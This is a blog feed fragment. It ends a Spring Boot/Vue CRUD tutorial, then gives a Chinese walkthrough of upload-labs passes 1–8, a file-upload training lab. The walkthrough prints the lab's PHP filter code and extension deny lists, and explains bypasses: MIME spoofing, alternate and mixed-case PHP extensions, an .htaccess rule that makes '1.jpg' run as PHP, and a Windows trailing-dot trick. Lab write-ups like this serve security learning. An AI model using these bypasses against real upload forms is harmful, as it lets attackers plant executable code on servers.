<pre><code class="hljs js"><span class="hljs-attr">dialogFormVisible</span>: <span class="hljs-literal">false</span>,<span class="hljs-comment">//添加表单是否可见</span>
formData</code></pre>

<p>对话框控制函数</p>
<pre><code class="hljs java"><span class="hljs-comment">//弹出添加窗口</span>
handleCreate() &#123;
    <span class="hljs-built_in">this</span>.dialogFormVisible = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.resetForm();
&#125;,</code></pre>

<p>重置表单功能</p>
<pre><code class="hljs java"><span class="hljs-comment">//重置表单</span>
resetForm() &#123;
    <span class="hljs-built_in">this</span>.formData = &#123;&#125;;
&#125;,</code></pre>

<p>添加功能</p>
<pre><code class="hljs java">handleAdd () &#123;
    axios.post(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-built_in">this</span>.formData).then((res) =&gt; &#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-built_in">this</span>.dialogFormVisible = <span class="hljs-literal">false</span>;
            <span class="hljs-built_in">this</span>.$message.success(<span class="hljs-string">&quot;添加成功！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&quot;添加失败！&quot;</span>);
        &#125;
    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
        <span class="hljs-built_in">this</span>.getAll();
    &#125;)
&#125;</code></pre>

<h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><pre><code class="hljs java"><span class="hljs-comment">// 删除</span>
handleDelete(row) &#123;
    axios.delete(<span class="hljs-string">&quot;/books/&quot;</span> + row.id).then((res)=&gt;&#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-built_in">this</span>.$message.success(<span class="hljs-string">&quot;删除成功！&quot;</span>);
            <span class="hljs-built_in">this</span>.getAll();
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&quot;删除失败！&quot;</span>);
        &#125;
    &#125;)
&#125;,</code></pre>

<h4 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h4><pre><code class="hljs java"><span class="hljs-comment">//弹出编辑窗口</span>
handleUpdate(row) &#123;
    <span class="hljs-built_in">this</span>.dialogFormVisible4Edit = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.formData = row;
&#125;,

<span class="hljs-comment">//修改</span>
handleEdit() &#123;
    axios.put(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-built_in">this</span>.formData).then((res) =&gt; &#123;
        <span class="hljs-keyword">if</span>(res.data.flag)&#123;
            <span class="hljs-built_in">this</span>.dialogFormVisible4Edit = <span class="hljs-literal">false</span>;
            <span class="hljs-built_in">this</span>.$message.success(<span class="hljs-string">&quot;修改成功！&quot;</span>);
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&quot;修改失败！&quot;</span>);
        &#125;
    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;
        <span class="hljs-built_in">this</span>.getAll();
    &#125;)
&#125;,</code></pre>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>uploads-labs</title>
    <url>/2020/09/16/uploads/</url>
    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span>



<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<pre><code class="hljs bash">text/plain
text/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
application/*
application/json
application/javascript
application/ecmascript
application/octet-stream</code></pre>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止&#x2F;允许特定IP&#x2F;IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
<span class="hljs-attribute">SetHandler</span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>本题与第十题完全一样，详细解答见第十题</p>
<p><img src="/uploads/5.png"></p>
<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细查看源码会发现少了下面的这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>跟第六关对比发现少了这句话</p>
<pre><code>  $file_ext = trim($file_ext); //首尾去空
</code></pre>
<p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png"></p>
<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
